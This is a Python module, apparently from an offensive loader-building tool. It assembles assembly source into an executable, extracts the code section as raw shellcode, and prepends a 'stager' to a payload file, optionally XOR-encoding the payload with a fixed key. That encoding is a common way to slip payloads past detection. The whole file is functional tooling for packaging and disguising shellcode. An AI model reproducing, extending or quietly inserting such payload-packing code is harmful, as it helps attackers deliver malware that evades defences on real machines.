import pefile
import pprint

from model import *
from helper import *
from config import config
from observer import observer
from project import project


def make_shc_from_asm(asm_file, exe_file, shc_file):
    print("--[ Assemble to exe: {} -> {} -> {} ]".format(asm_file, exe_file, shc_file))

    print("---[ Assemble ASM to EXE: {} -> {} ]".format(asm_file, exe_file))
    run_process_checkret([
        config.get("path_ml64"),
        asm_file,
        "/link",
        "/OUT:{}".format(exe_file),
        "/entry:AlignRSP"
    ])
    if not os.path.isfile(exe_file):
        print("Error")
        return

    print("---[ EXE to SHC: {} -> {} ]".format(exe_file, shc_file))
    code = get_code_section_data(exe_file)
    with open(shc_file, 'wb') as f:
        f.write(code)

    return code
    #print("---[ Shellcode from {} written to: {}  (size: {}) ]".format(exe_file, shc_file, len(code)))


def merge_loader_payload(main_shc_file):
    print("--[ Merge stager: {} + {} -> {} ] ".format(
        main_shc_file, project.payload, main_shc_file))
    with open(main_shc_file, 'rb') as input1:
        data_stager = input1.read()
    with open(project.payload, 'rb') as input2:
        data_payload = input2.read()

    if project.decoder_style == DecoderStyle.PLAIN_1:
        pass
    elif project.decoder_style == DecoderStyle.XOR_1:
        xor_key = 0x42
        print("---[ XOR payload with key 0x{:x}".format(xor_key))
        data_payload = bytes([byte ^ xor_key for byte in data_payload])

    print("---[ Size: Stager: {} and Payload: {}  Sum: {} ]".format(
        len(data_stager), len(data_payload), len(data_stager)+len(data_payload)))

    with open(main_shc_file, 'wb') as output:
        data = data_stager + data_payload
        output.write(data)
        observer.add_code("final_shellcode", data) 
